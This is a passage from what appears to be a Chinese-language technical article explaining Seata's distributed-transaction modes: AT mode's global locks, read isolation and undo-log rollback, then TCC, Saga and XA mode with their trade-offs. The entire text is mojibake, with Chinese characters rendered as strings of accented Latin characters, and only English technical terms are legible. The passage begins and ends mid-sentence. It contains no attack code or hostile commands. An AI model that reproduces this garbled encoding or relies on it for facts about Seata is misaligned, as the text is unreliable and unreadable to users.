æœ¬åœ°äº‹åŠ¡æäº¤å‰ï¼Œå°è¯•æ‹¿è¯¥è®°å½•çš„å…¨å±€é”ï¼›tx1 å…¨å±€æäº¤å‰ï¼Œè¯¥è®°å½•çš„å…¨å±€é”è¢« tx1 æŒæœ‰ï¼Œtx2 éœ€è¦é‡è¯•ç­‰å¾…å…¨å±€é” ã€‚ å¦‚æœ tx1 äºŒé˜¶æ®µå…¨å±€æäº¤ï¼Œé‡Šæ”¾å…¨å±€é”ï¼Œtx2 æ‹¿åˆ°å…¨å±€é”åæäº¤æœ¬åœ°äº‹åŠ¡ å¦‚æœ tx1 çš„äºŒé˜¶æ®µå…¨å±€å›æ»šï¼Œåˆ™ tx1 éœ€è¦é‡æ–°è·å–è¯¥æ•°æ®çš„æœ¬åœ°é”ï¼Œè¿›è¡Œåå‘è¡¥å¿çš„æ›´æ–°æ“ä½œï¼Œå®ç°åˆ†æ”¯äº‹åŠ¡çš„å›æ»šã€‚æ­¤æ—¶ï¼Œå¦‚æœ tx2 ä»åœ¨ç­‰å¾…è¯¥æ•°æ®çš„å…¨å±€é”ï¼ŒåŒæ—¶æŒæœ‰æœ¬åœ°é”ï¼Œåˆ™ tx1 çš„åˆ†æ”¯äº‹åŠ¡å›æ»šä¼šå¤±è´¥ã€‚tx1 çš„åˆ†æ”¯äº‹åŠ¡å›æ»šä¼šä¸€ç›´é‡è¯•ï¼Œç›´åˆ° tx2 çš„å…¨å±€é”ç­‰é”è¶…æ—¶ï¼Œæ”¾å¼ƒç­‰å¾…å…¨å±€é”å¹¶å›æ»šæœ¬åœ°äº‹åŠ¡é‡Šæ”¾æœ¬åœ°é”ï¼Œtx1 çš„åˆ†æ”¯äº‹åŠ¡æœ€ç»ˆå›æ»šæˆåŠŸã€‚å› ä¸ºæ•´ä¸ªè¿‡ç¨‹å…¨å±€é”åœ¨ tx1 ç»“æŸå‰ä¸€ç›´æ˜¯è¢« tx1 æŒæœ‰çš„ï¼Œæ‰€ä»¥ä¸ä¼šå‡ºç°è„å†™çš„é—®é¢˜ã€‚ 2.3ã€è¯»éš”ç¦»åœ¨æ•°æ®åº“æœ¬åœ°äº‹åŠ¡éš”ç¦»çº§åˆ«è¯»å·²æäº¤ï¼ˆRead Committedï¼‰æˆ–ä»¥ä¸Šçš„åŸºç¡€ä¸Šï¼ŒSeataï¼ˆAT æ¨¡å¼ï¼‰çš„é»˜è®¤å…¨å±€éš”ç¦»çº§åˆ«æ˜¯è¯»æœªæäº¤ï¼ˆRead Uncommittedï¼‰ã€‚å¦‚æœåº”ç”¨åœ¨ç‰¹å®šåœºæ™¯ä¸‹ï¼Œå¿…éœ€è¦æ±‚å…¨å±€çš„è¯»å·²æäº¤ï¼Œç›®å‰ Seata çš„æ–¹å¼æ˜¯é€šè¿‡ SELECT FOR UPDATE è¯­å¥çš„ä»£ç†ã€‚ SELECT FOR UPDATE è¯­å¥çš„æ‰§è¡Œä¼šç”³è¯·å…¨å±€é”ï¼Œå¦‚æœå…¨å±€é”è¢«å…¶ä»–äº‹åŠ¡æŒæœ‰ï¼Œåˆ™é‡Šæ”¾æœ¬åœ°é”ï¼ˆå›æ»š SELECT FOR UPDATE è¯­å¥çš„æœ¬åœ°æ‰§è¡Œï¼‰å¹¶é‡è¯•ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼ŒæŸ¥è¯¢æ˜¯è¢« block ä½çš„ï¼Œç›´åˆ°æ‹¿åˆ°å…¨å±€é”ï¼Œå³è¯»å–çš„ç›¸å…³æ•°æ®æ˜¯å·²æäº¤çš„æ‰è¿”å›ã€‚å‡ºäºæ€»ä½“æ€§èƒ½ä¸Šçš„è€ƒè™‘ï¼ŒSeata ç›®å‰çš„æ–¹æ¡ˆå¹¶æ²¡æœ‰å¯¹æ‰€æœ‰ SELECT è¯­å¥éƒ½è¿›è¡Œä»£ç†ï¼Œä»…é’ˆå¯¹ FOR UPDATE çš„ SELECT è¯­å¥ã€‚ 2.4ã€æ•´ä½“æœºåˆ¶AT æ¨¡å¼æœ¬è´¨æ˜¯ä¸¤é˜¶æ®µæäº¤åè®®ï¼ˆ2PCï¼‰çš„æ¼”å˜ï¼š ä¸€é˜¶æ®µï¼šä¸šåŠ¡æ•°æ®å’Œå›æ»šæ—¥å¿—è®°å½•åœ¨åŒä¸€ä¸ªæœ¬åœ°äº‹åŠ¡ä¸­æäº¤ï¼Œé‡Šæ”¾æœ¬åœ°é”å’Œè¿æ¥èµ„æº äºŒé˜¶æ®µï¼š æäº¤å¼‚æ­¥åŒ–ï¼Œéå¸¸å¿«é€Ÿåœ°å®Œæˆ å›æ»šæ˜¯é€šè¿‡ä¸€é˜¶æ®µçš„å›æ»šæ—¥å¿—è¿›è¡Œåå‘è¡¥å¿ ä¸€é˜¶æ®µï¼š åœ¨ä¸€é˜¶æ®µï¼ŒSeata ä¼šæ‹¦æˆªä¸šåŠ¡ SQLï¼š 1ï¼‰é¦–å…ˆè§£æ SQL è¯­ä¹‰ï¼Œæ‰¾åˆ°ä¸šåŠ¡ SQL è¦æ›´æ–°çš„ä¸šåŠ¡æ•°æ®ï¼Œåœ¨ä¸šåŠ¡æ•°æ®è¢«æ›´æ–°å‰ï¼Œå°†å…¶ä¿å­˜æˆ before image 2ï¼‰æ‰§è¡Œ ä¸šåŠ¡ SQL æ›´æ–°ä¸šåŠ¡æ•°æ®ï¼Œåœ¨ä¸šåŠ¡æ•°æ®æ›´æ–°ä¹‹åï¼Œå†å°†å…¶ä¿å­˜æˆ after image 3ï¼‰æœ€åç”Ÿæˆè¡Œé” ä»¥ä¸Šæ“ä½œå…¨éƒ¨åœ¨ä¸€ä¸ªæ•°æ®åº“äº‹åŠ¡å†…å®Œæˆï¼Œè¿™æ ·ä¿è¯äº†ä¸€é˜¶æ®µæ“ä½œçš„åŸå­æ€§ï¼Œä»»ä½•æäº¤çš„ä¸šåŠ¡æ•°æ®çš„æ›´æ–°ä¸€å®šæœ‰ç›¸åº”çš„å›æ»šæ—¥å¿—å­˜åœ¨ åŸºäºè¿™æ ·çš„æœºåˆ¶ï¼Œåˆ†æ”¯çš„æœ¬åœ°äº‹åŠ¡ä¾¿å¯ä»¥åœ¨å…¨å±€äº‹åŠ¡çš„ç¬¬ä¸€é˜¶æ®µæäº¤ï¼Œå¹¶é©¬ä¸Šé‡Šæ”¾æœ¬åœ°äº‹åŠ¡é”å®šçš„èµ„æºï¼›è¿™ä¹Ÿæ˜¯ Seata å’Œ XA äº‹åŠ¡çš„ä¸åŒä¹‹å¤„ï¼Œä¸¤é˜¶æ®µæäº¤å¾€å¾€å¯¹èµ„æºçš„é”å®šéœ€è¦æŒç»­åˆ°ç¬¬äºŒé˜¶æ®µå®é™…çš„æäº¤æˆ–è€…å›æ»šæ“ä½œï¼Œè€Œæœ‰äº†å›æ»šæ—¥å¿—ä¹‹åï¼Œå¯ä»¥åœ¨ç¬¬ä¸€é˜¶æ®µé‡Šæ”¾å¯¹èµ„æºçš„é”å®šï¼Œé™ä½äº†é”èŒƒå›´ï¼Œæé«˜æ•ˆç‡ï¼Œå³ä½¿ç¬¬äºŒé˜¶æ®µå‘ç”Ÿå¼‚å¸¸éœ€è¦å›æ»šï¼Œåªéœ€æ‰¾å¯¹ undolog ä¸­å¯¹åº”æ•°æ®å¹¶åè§£ææˆ SQL æ¥è¾¾åˆ°å›æ»šç›®çš„ã€‚åŒæ—¶ Seata é€šè¿‡ä»£ç†æ•°æ®æºå°†ä¸šåŠ¡ SQL çš„æ‰§è¡Œè§£ææˆ undolog æ¥ä¸ä¸šåŠ¡æ•°æ®çš„æ›´æ–°åŒæ—¶å…¥åº“ï¼Œè¾¾åˆ°äº†å¯¹ä¸šåŠ¡æ— ä¾µå…¥çš„æ•ˆæœã€‚ äºŒé˜¶æ®µæäº¤ï¼š äºŒé˜¶æ®µå¦‚æœæ˜¯æäº¤çš„è¯ï¼Œå› ä¸º ä¸šåŠ¡ SQL åœ¨ä¸€é˜¶æ®µå·²ç»æäº¤è‡³æ•°æ®åº“ï¼Œæ‰€ä»¥ Seata æ¡†æ¶åªéœ€å°†ä¸€é˜¶æ®µä¿å­˜çš„å¿«ç…§æ•°æ®å’Œè¡Œé”åˆ æ‰ï¼Œå®Œæˆæ•°æ®æ¸…ç†å³å¯ã€‚ äºŒé˜¶æ®µå›æ»šï¼š äºŒé˜¶æ®µå¦‚æœæ˜¯å›æ»šçš„è¯ï¼ŒSeata å°±éœ€è¦å›æ»šä¸€é˜¶æ®µå·²ç»æ‰§è¡Œçš„ ä¸šåŠ¡ SQL æ¥è¿˜åŸä¸šåŠ¡æ•°æ®ã€‚å›æ»šæ–¹å¼ä¾¿æ˜¯ç”¨ before image è¿˜åŸä¸šåŠ¡æ•°æ®ï¼›ä½†åœ¨è¿˜åŸå‰è¦é¦–å…ˆè¦æ ¡éªŒè„å†™ï¼Œå¯¹æ¯” æ•°æ®åº“å½“å‰ä¸šåŠ¡æ•°æ® å’Œ after imageï¼Œå¦‚æœä¸¤ä»½æ•°æ®å®Œå…¨ä¸€è‡´å°±è¯´æ˜æ²¡æœ‰è„å†™ï¼Œå¯ä»¥è¿˜åŸä¸šåŠ¡æ•°æ®ï¼Œå¦‚æœä¸ä¸€è‡´å°±è¯´æ˜æœ‰è„å†™ï¼Œå‡ºç°è„å†™å°±éœ€è¦æ ¹æ®é…ç½®ç­–ç•¥æ¥åšå¤„ç†ï¼ˆå¦‚è½¬äººå·¥å¤„ç†ï¼‰ã€‚ é€šä¿—è®²ï¼š ç¬¬ä¸€é˜¶æ®µï¼šå‡å¦‚æˆ‘ä»¬ç°åœ¨æ’å…¥æˆ–æ›´æ–°ä¸€æ¡æ•°æ®ï¼Œæ ¹æ®åŠ¨æ€ä»£ç†å®ƒä¼šæå–ä½ æ’å…¥æˆ–æ›´æ–°çš„æ•°æ®ï¼Œä¿å­˜ä¸€ä¸ªåŸå¿«ç…§ï¼Œç„¶åå†å»æ‰§è¡Œ ä¸šåŠ¡ SQLï¼Œå†ä¿å­˜ä¸€ä¸ªæ–°å¿«ç…§ï¼Œç”Ÿæˆä¸€ä¸ªè¡Œé”ã€‚å½“ä½ è¿™ä¸ªä¸šåŠ¡æ–¹æ³•æ²¡æœ‰æ‰§è¡Œå®Œï¼Œè¿™ä¸ªé”æ˜¯ä¸ä¼šé‡Šæ”¾çš„ã€‚æœ€ç»ˆæäº¤ ä¸šåŠ¡ SQLï¼Œä¸šåŠ¡è¡¨å’Œ unlog è¡¨æ˜¯åœ¨åŒä¸€ä¸ªæœ¬åœ°äº‹åŠ¡ä¸­ï¼Œä¹Ÿå°±æ˜¯è¦ä¹ˆåŒæ—¶æˆåŠŸï¼Œè¦ä¹ˆåŒæ—¶å¤±è´¥ã€‚å› ä¸ºä½ æ›´æ–°æˆ–æ’å…¥ä¸€æ¡æ•°æ®ï¼Œunlog è¡¨ä¼šè®°å½•ä¸€äº›åŸå§‹æ•°æ®ä¾¿äºå›æ»šï¼Œæ˜¯ Seata å¸®åŠ©æˆ‘ä»¬å®ç°äº†å›æ»š ç¬¬äºŒé˜¶æ®µï¼šåœ¨è¿™ä¸ªé˜¶æ®µ Seata ä¼šæŸ¥çœ‹ä½ çš„æ—¥å¿—æ˜¯å¦æˆåŠŸï¼Œå¦‚æœæˆåŠŸä¸ä¼šåšä»»ä½•æ“ä½œï¼Œå¦‚æœå¤±è´¥ï¼Œå®ƒä¼šåšä¸€ä¸ªåå‘è¡¥å¿ï¼Œä½¿ç”¨ unlog è¡¨è®°å½•ä¸€äº›åŸæ•°æ®è¿›è¡Œå›æ»šæ“ä½œ 2.5ã€é€‚ç”¨åœºæ™¯ä¸ä¼˜ç¼ºç‚¹é€‚ç”¨åœºæ™¯ï¼š åˆ†å¸ƒå¼äº‹åŠ¡çš„ä¸šåŠ¡é€»è¾‘ä¸­ä»…ä»…æ˜¯çº¯æ•°æ®åº“æ“ä½œï¼Œä¸åŒ…å«å…¶ä»–ä¸­é—´ä»¶çš„äº‹åŠ¡é€»è¾‘ ä¼˜ç‚¹ï¼š æ”¹åŠ¨åŠä»£ç ä¾µå…¥æœ€å°ï¼Œç”± Seata æ¥è´Ÿè´£ Commit å’Œ Rollback çš„è‡ªåŠ¨åŒ–æäº¤æˆ–å›æ»šæ“ä½œ ç¼ºç‚¹ï¼š å¦‚æœäº‹åŠ¡ä¸­åŒ…å«ç¼“å­˜å­˜å‚¨æˆ–å‘é€ MQ æ¶ˆæ¯ç­‰ï¼Œåˆ™ä¸é€‚åˆä½¿ç”¨ å¤šæ¬¡å¯¹æ•°æ®åº“æ“ä½œï¼Œä»¥åŠå…¨å±€è¡Œé”çš„å­˜åœ¨å¯¹å¹¶å‘å¤„ç†æ€§èƒ½æœ‰å½±å“ ä¸ºäº†ä¿è¯é•œåƒ SQL çš„å¯é æ€§ï¼Œéœ€è¦ç”¨æˆ·å¯¹ SQL å°½é‡åšç®€åŒ–ï¼Œå»ºè®®åšæ³•ï¼šå°†å¤šæ¡ SQL è¯­å¥åˆ†è§£ä¸ºå¤šä¸ªäº‹åŠ¡ä¸­çš„åŸå­æ­¥éª¤ï¼ˆå¯¹åº” Seata AT æ¨¡å¼çš„åˆ†æ”¯ Branch æ¦‚å¿µï¼‰ï¼Œå¦‚æœå•æ¡ SQL è¯­å¥è·¨è¡¨ï¼Œä¹Ÿåˆ†è§£æˆä¸ºå¤šä¸ªäº‹åŠ¡ä¸­çš„åŸå­æ­¥éª¤ï¼ˆå°½é‡é™ä½ Seata å­˜å‚¨å‰ SQL é•œåƒç»“æœæ—¶çš„é£é™©ï¼‰ 3ã€TCC æ¨¡å¼3.1ã€æ¦‚è¿°è¯¥æ¨¡å¼ç”±èš‚èšé‡‘æœè´¡çŒ®ï¼ŒTCC éœ€è¦ç”¨æˆ·æ ¹æ®è‡ªå·±çš„ä¸šåŠ¡åœºæ™¯å®ç° Tryã€Confirm å’Œ Cancel ä¸‰ä¸ªæ¥å£ã€‚äº‹åŠ¡å‘èµ·æ–¹åœ¨ä¸€é˜¶æ®µæ‰§è¡Œ Try æ“ä½œï¼Œåœ¨äºŒé˜¶æ®µæäº¤æ‰§è¡Œ Confirm æ“ä½œï¼ŒäºŒé˜¶æ®µå›æ»šæ‰§è¡Œ Cancel æ“ä½œã€‚TCC ä¸‰ä¸ªæ¥å£çš„æè¿°å¦‚ä¸‹ï¼š Tryï¼šèµ„æºçš„æ£€æµ‹å’Œé¢„ç•™ Confirmï¼šæ‰§è¡Œçš„ä¸šåŠ¡æ“ä½œæäº¤ï¼Œè¦æ±‚ Try æˆåŠŸ Confirm å°±ä¸€å®šè¦èƒ½æˆåŠŸ Cancelï¼šé¢„ç•™èµ„æºé‡Šæ”¾ ä¸€ä¸ªåˆ†å¸ƒå¼çš„å…¨å±€äº‹åŠ¡ï¼Œæ•´ä½“æ˜¯ä¸¤é˜¶æ®µæäº¤çš„æ¨¡å‹ã€‚å…¨å±€äº‹åŠ¡æ˜¯ç”±è‹¥å¹²åˆ†æ”¯äº‹åŠ¡ç»„æˆçš„ï¼Œåˆ†æ”¯äº‹åŠ¡è¦æ»¡è¶³ä¸¤é˜¶æ®µæäº¤çš„æ¨¡å‹è¦æ±‚ï¼Œå³éœ€è¦æ¯ä¸ªåˆ†æ”¯äº‹åŠ¡éƒ½å…·å¤‡è‡ªå·±çš„ï¼š ä¸€é˜¶æ®µ prepare è¡Œä¸º äºŒé˜¶æ®µ commit æˆ– rollback è¡Œä¸º 3.2ã€AT ä¸ TCC çš„åŒºåˆ«æ ¹æ®ä¸¤é˜¶æ®µè¡Œä¸ºæ¨¡å¼çš„ä¸åŒï¼Œå¯ä»¥å°†åˆ†æ”¯äº‹åŠ¡åˆ’åˆ†ä¸º Automatic (Branch) Transaction Mode å’Œ Manual (Branch) Transaction Modeã€‚ AT æ¨¡å¼åŸºäºæ”¯æŒæœ¬åœ° ACID äº‹åŠ¡çš„å…³ç³»å‹æ•°æ®åº“ï¼š ä¸€é˜¶æ®µ prepare è¡Œä¸ºï¼šåœ¨æœ¬åœ°äº‹åŠ¡ä¸­ï¼Œä¸€å¹¶æäº¤ä¸šåŠ¡æ•°æ®æ›´æ–°å’Œç›¸åº”å›æ»šæ—¥å¿—è®°å½• äºŒé˜¶æ®µ commit è¡Œä¸ºï¼šé©¬ä¸ŠæˆåŠŸç»“æŸï¼Œè‡ªåŠ¨å¼‚æ­¥æ‰¹é‡æ¸…ç†å›æ»šæ—¥å¿— äºŒé˜¶æ®µ rollback è¡Œä¸ºï¼šé€šè¿‡å›æ»šæ—¥å¿—ï¼Œè‡ªåŠ¨ç”Ÿæˆè¡¥å¿æ“ä½œï¼Œå®Œæˆæ•°æ®å›æ»š ç›¸åº”çš„ï¼ŒTCC æ¨¡å¼ï¼Œä¸ä¾èµ–äºåº•å±‚æ•°æ®èµ„æºçš„äº‹åŠ¡æ”¯æŒï¼š ä¸€é˜¶æ®µ prepare è¡Œä¸ºï¼šè°ƒç”¨ è‡ªå®šä¹‰ çš„ prepare é€»è¾‘ äºŒé˜¶æ®µ commit è¡Œä¸ºï¼šè°ƒç”¨ è‡ªå®šä¹‰ çš„ commit é€»è¾‘ äºŒé˜¶æ®µ rollback è¡Œä¸ºï¼šè°ƒç”¨ è‡ªå®šä¹‰ çš„ rollback é€»è¾‘ æ‰€è°“çš„ Seata TCC æ¨¡å¼ï¼Œæ˜¯æŒ‡æ”¯æŒæŠŠè‡ªå®šä¹‰çš„åˆ†æ”¯äº‹åŠ¡çº³å…¥åˆ°å…¨å±€äº‹åŠ¡çš„ç®¡ç†ä¸­ 3.3ã€é€‚ç”¨åœºæ™¯ä¸ä¼˜ç¼ºç‚¹é€‚ç”¨åœºæ™¯ï¼š åˆ†å¸ƒå¼äº‹åŠ¡çš„ä¸šåŠ¡é€»è¾‘ä¸­é™¤äº†æ•°æ®åº“æ“ä½œå¤–ï¼ŒåŒ…å«å…¶ä»–ä¸­é—´ä»¶äº‹åŠ¡é€»è¾‘ ä¼˜ç‚¹ï¼š é€‚åˆå¾®æœåŠ¡åŒ–åœºæ™¯ æ—  AT æ¨¡å¼çš„å…¨å±€è¡Œé”ï¼ŒTCC æ€§èƒ½ä¼šæ¯” AT æ¨¡å¼é«˜å¾ˆå¤š ç”¨æˆ·å¯ä»¥è‡ªå·±å®šä¹‰ä¸šåŠ¡çš„è¡¥å¿é€»è¾‘ï¼Œç”±ä¸šåŠ¡å±‚ä¿è¯äº‹åŠ¡çš„ä¸€è‡´æ€§ ç¼ºç‚¹ï¼š TCC æ¨¡å¼ä¸‹å¼€å‘è€…éœ€è¦è‡ªè¡Œå®ç° Tryã€Confirmã€Cancel æ¥å£ï¼Œå¯¹ä¸šåŠ¡ä»£ç æœ‰ä¸€å®šçš„ä¾µå…¥æ€§ éœ€è¦è€ƒè™‘å¦‚ä½•å°†ä¸šåŠ¡æ¨¡å‹æ‹†æˆ 2 é˜¶æ®µï¼Œå®ç°æˆ TCC çš„ 3 ä¸ªæ–¹æ³•ï¼Œå¹¶ä¸”ä¿è¯ Try æˆåŠŸ Confirm å°±ä¸€å®šèƒ½æˆåŠŸï¼ŒConfirm å¤±è´¥ä¼šä¸æ–­é‡è¯• 4ã€Saga æ¨¡å¼4.1ã€æ¦‚è¿°Saga æ¨¡å¼æ˜¯ Seata æä¾›çš„é•¿äº‹åŠ¡è§£å†³æ–¹æ¡ˆï¼Œè¯¥æ¨¡å¼ä¸»è¦ç”±èš‚èšé‡‘æœè´¡çŒ®ï¼Œåœ¨ Saga æ¨¡å¼ä¸­ï¼Œä¸šåŠ¡æµç¨‹ä¸­æ¯ä¸ªå‚ä¸è€…éƒ½æäº¤æœ¬åœ°äº‹åŠ¡ï¼Œå½“å‡ºç°æŸä¸€ä¸ªå‚ä¸è€…å¤±è´¥åˆ™è¡¥å¿å‰é¢å·²ç»æˆåŠŸçš„å‚ä¸è€…ï¼Œä¸€é˜¶æ®µæ­£å‘æœåŠ¡å’ŒäºŒé˜¶æ®µè¡¥å¿æœåŠ¡éƒ½ç”±ä¸šåŠ¡å¼€å‘å®ç°ã€‚ 4.2ã€æ•´ä½“æœºåˆ¶ç›®å‰ Seata æä¾›çš„ Saga æ¨¡å¼æ˜¯åŸºäºçŠ¶æ€æœºå¼•æ“æ¥å®ç°çš„ï¼Œæœºåˆ¶æ˜¯ï¼š 1ï¼‰é€šè¿‡çŠ¶æ€å›¾æ¥å®šä¹‰æœåŠ¡è°ƒç”¨çš„æµç¨‹ï¼Œå¹¶ç”Ÿæˆ Json çŠ¶æ€è¯­è¨€å®šä¹‰æ–‡ä»¶ 2ï¼‰çŠ¶æ€å›¾ä¸­ä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥æ˜¯è°ƒç”¨ä¸€ä¸ªæœåŠ¡ï¼ŒèŠ‚ç‚¹å¯ä»¥é…ç½®å®ƒçš„è¡¥å¿èŠ‚ç‚¹ 3ï¼‰çŠ¶æ€å›¾ Json ç”±çŠ¶æ€æœºå¼•æ“é©±åŠ¨æ‰§è¡Œï¼Œå½“å‡ºç°å¼‚å¸¸æ—¶çŠ¶æ€å¼•æ“åå‘æ‰§è¡Œå·²æˆåŠŸèŠ‚ç‚¹å¯¹åº”çš„è¡¥å¿èŠ‚ç‚¹å°†äº‹åŠ¡å›æ»šï¼ˆæ³¨æ„ï¼šå¼‚å¸¸å‘ç”Ÿæ—¶æ˜¯å¦è¿›è¡Œè¡¥å¿ä¹Ÿå¯ç”±ç”¨æˆ·è‡ªå®šä¹‰å†³å®šï¼‰ 4ï¼‰å¯ä»¥å®ç°æœåŠ¡ç¼–æ’éœ€æ±‚ï¼Œæ”¯æŒå•é¡¹é€‰æ‹©ã€å¹¶å‘ã€å­æµç¨‹ã€å‚æ•°è½¬æ¢ã€å‚æ•°æ˜ å°„ã€æœåŠ¡æ‰§è¡ŒçŠ¶æ€åˆ¤æ–­ã€å¼‚å¸¸æ•è·ç­‰åŠŸèƒ½ 4.3ã€é€‚ç”¨åœºæ™¯ä¸ä¼˜ç¼ºç‚¹é€‚ç”¨åœºæ™¯ï¼š å¯¹æ•°æ®éš”ç¦»æ€§è¦æ±‚ä¸é«˜ï¼Œå¯¹æ€§èƒ½è¦æ±‚é«˜çš„åœºæ™¯ å‚ä¸è€…åŒ…å«å…¶å®ƒå…¬å¸æˆ–é—ç•™ç³»ç»ŸæœåŠ¡ï¼Œæ— æ³•æä¾› TCC æ¨¡å¼è¦æ±‚çš„ä¸‰ä¸ªæ¥å£ ä¸šåŠ¡æµç¨‹é•¿ã€ä¸šåŠ¡æµç¨‹å¤šã€ä¸éœ€é©¬ä¸Šè¿”å›æœ€ç»ˆç»“æœï¼Œåªè¦ä¿è¯æœ€ç»ˆä¸€è‡´æ€§çš„åœºæ™¯ ä¼˜ç‚¹ï¼š è¡¥å¿é€»è¾‘æ˜“äºå®ç° ä¸€é˜¶æ®µæäº¤æœ¬åœ°äº‹åŠ¡ï¼Œæ— é”ï¼Œé«˜æ€§èƒ½ äº‹ä»¶é©±åŠ¨æ¶æ„ï¼Œå‚ä¸è€…å¯å¼‚æ­¥æ‰§è¡Œï¼Œé«˜ååé‡ ç¼ºç‚¹ï¼š ä¸ä¿è¯éš”ç¦»æ€§ è¡¥å¿é€»è¾‘éœ€è¦è‡ªè¡Œå®ç° 5ã€XA æ¨¡å¼5.1ã€å‰æ æ”¯æŒ XA äº‹åŠ¡çš„æ•°æ®åº“ Java åº”ç”¨ï¼Œé€šè¿‡ JDBC è®¿é—®æ•°æ®åº“ 5.2ã€æ•´ä½“æœºåˆ¶åœ¨ Seata å®šä¹‰çš„åˆ†å¸ƒå¼äº‹åŠ¡æ¡†æ¶å†…ï¼Œåˆ©ç”¨äº‹åŠ¡èµ„æºï¼ˆæ•°æ®åº“ã€æ¶ˆæ¯æœåŠ¡ç­‰ï¼‰å¯¹ XA åè®®çš„æ”¯æŒï¼Œä»¥ XA åè®®çš„æœºåˆ¶æ¥ç®¡ç†åˆ†æ”¯äº‹åŠ¡çš„ä¸€ç§äº‹åŠ¡æ¨¡å¼ã€‚ æ‰§è¡Œé˜¶æ®µï¼š å¯å›æ»šï¼šä¸šåŠ¡ SQL æ“ä½œæ”¾åœ¨ XA åˆ†æ”¯ä¸­è¿›è¡Œï¼Œç”±èµ„æºå¯¹ XA åè®®çš„æ”¯æŒæ¥ä¿è¯å¯å›æ»š æŒä¹…åŒ–ï¼šXA åˆ†æ”¯å®Œæˆåï¼Œæ‰§è¡Œ XA Prepareï¼ŒåŒæ ·ï¼Œç”±èµ„æºå¯¹ XA åè®®çš„æ”¯æŒæ¥ä¿è¯æŒä¹…åŒ–ï¼ˆå³ä¹‹åä»»ä½•æ„å¤–éƒ½ä¸ä¼šé€ æˆæ— æ³•å›æ»šçš„æƒ…å†µï¼‰ å®Œæˆé˜¶æ®µï¼š åˆ†æ”¯æäº¤ï¼šæ‰§è¡Œ XA åˆ†æ”¯çš„ Commit åˆ†æ”¯å›æ»šï¼šæ‰§è¡Œ XA åˆ†æ”¯çš„ Rollback 5.3ã€å·¥ä½œæœºåˆ¶æ•´ä½“è¿è¡Œæœºåˆ¶ï¼š XA æ¨¡å¼ è¿è¡Œåœ¨ Seata å®šä¹‰çš„äº‹åŠ¡æ¡†æ¶å†…ï¼š æ‰§è¡Œé˜¶æ®µï¼ˆE xecuteï¼‰ï¼šXA start/XA end/XA prepare + SQL + æ³¨å†Œåˆ†æ”¯ å®Œæˆé˜¶æ®µï¼ˆF inishï¼‰ï¼šXA commit/XA rollback æ•°æ®æºä»£ç†ï¼š XA æ¨¡å¼éœ€è¦ä¾èµ– XAConnectionï¼Œè·å– XAConnection ä¸¤ç§æ–¹å¼ï¼š æ–¹å¼ä¸€ï¼šè¦æ±‚å¼€å‘è€…é…ç½® XADataSourceï¼Œç»™å¼€å‘è€…å¢åŠ äº†è®¤çŸ¥è´Ÿæ‹…ï¼Œéœ€è¦ä¸º XA æ¨¡å¼ä¸“é—¨å»å­¦ä¹ å’Œä½¿ç”¨ XA æ•°æ®æºï¼Œä¸é€æ˜åŒ– XA ç¼–ç¨‹æ¨¡å‹çš„è®¾è®¡ç›®æ ‡ç›¸è¿èƒŒ æ–¹å¼äºŒï¼šæ ¹æ®å¼€å‘è€…çš„æ™®é€š DataSource æ¥åˆ›å»ºï¼Œå¯¹å¼€å‘è€…æ¯”è¾ƒå‹å¥½ï¼Œå’Œ AT æ¨¡å¼ä½¿ç”¨ä¸€æ ·ï¼Œå¼€å‘è€…å®Œå…¨ä¸å¿…å…³å¿ƒ XA å±‚é¢çš„ä»»ä½•é—®é¢˜ï¼Œä¿æŒæœ¬åœ°ç¼–ç¨‹æ¨¡å‹å³å¯ Seata ä¼˜å…ˆè®¾è®¡å®ç°ç¬¬äºŒç§æ–¹å¼ï¼šæ•°æ®æºä»£ç†æ ¹æ®æ™®é€šæ•°æ®æºä¸­è·å–çš„æ™®é€š JDBC è¿æ¥åˆ›å»ºå‡ºç›¸åº”çš„ XAConnectionï¼Œç±»æ¯” AT æ¨¡å¼çš„æ•°æ®æºä»£ç†æœºåˆ¶ï¼ˆå¦‚ä¸‹ï¼‰: ä½†æ˜¯ç¬¬äºŒç§æ–¹æ³•æœ‰å±€é™ï¼šæ— æ³•ä¿è¯å…¼å®¹çš„æ­£ç¡®æ€§ã€‚å®é™…ä¸Šï¼Œè¿™ç§æ–¹æ³•æ˜¯åœ¨åšæ•°æ®åº“é©±åŠ¨ç¨‹åºè¦åšçš„äº‹æƒ…ï¼›ä¸åŒçš„å‚å•†ã€ä¸åŒç‰ˆæœ¬çš„æ•°æ®åº“é©±åŠ¨å®ç°æœºåˆ¶æ˜¯å‚å•†ç§æœ‰çš„ï¼ŒSeata åªèƒ½ä¿è¯åœ¨å……åˆ†æµ‹è¯•è¿‡çš„é©±åŠ¨ç¨‹åºä¸Šæ˜¯æ­£ç¡®çš„ï¼Œå¼€å‘è€…ä½¿ç”¨çš„é©±åŠ¨ç¨‹åºç‰ˆæœ¬å·®å¼‚å¾ˆå¯èƒ½é€ æˆæœºåˆ¶çš„å¤±æ•ˆï¼Œè¿™ç‚¹åœ¨ Oracle ä¸Šä½“ç°éå¸¸æ˜æ˜¾ã€‚ ç»¼åˆè€ƒè™‘ï¼ŒXA æ¨¡å¼çš„æ•°æ®æºä»£ç†è®¾è®¡éœ€è¦åŒæ—¶æ”¯æŒç¬¬ä¸€ç§æ–¹å¼ï¼šåŸºäº XA æ•°æ®æºè¿›è¡Œä»£ç†ï¼Œç±»æ¯” AT æ¨¡å¼çš„æ•°æ®æºä»£ç†æœºåˆ¶ï¼ˆå¦‚ä¸‹ï¼‰ï¼š åˆ†æ”¯æ³¨å†Œï¼š XA Start éœ€è¦ Xid å‚æ•°ï¼Œè¿™ä¸ª Xid éœ€è¦å’Œ Seata å…¨å±€äº‹åŠ¡çš„ XID å’Œ BranchId å…³è”èµ·æ¥ï¼Œä»¥ä¾¿ç”± TC é©±åŠ¨ XA åˆ†æ”¯çš„æäº¤æˆ–å›æ»šã€‚ç›®å‰ Seata çš„ BranchId æ˜¯åœ¨åˆ†æ”¯æ³¨å†Œè¿‡ç¨‹ï¼Œç”± TC ç»Ÿä¸€ç”Ÿæˆçš„ï¼Œæ‰€ä»¥ XA æ¨¡å¼åˆ†æ”¯æ³¨å†Œçš„æ—¶æœºéœ€è¦åœ¨ XA start ä¹‹å‰ã€‚Seata çš„ XA æ¨¡å¼å°†æ¥ä¸€ä¸ªå¯èƒ½çš„ä¼˜åŒ–æ–¹å‘ï¼šæŠŠåˆ†æ”¯æ³¨å†Œå°½é‡å»¶åã€‚ç±»ä¼¼ AT 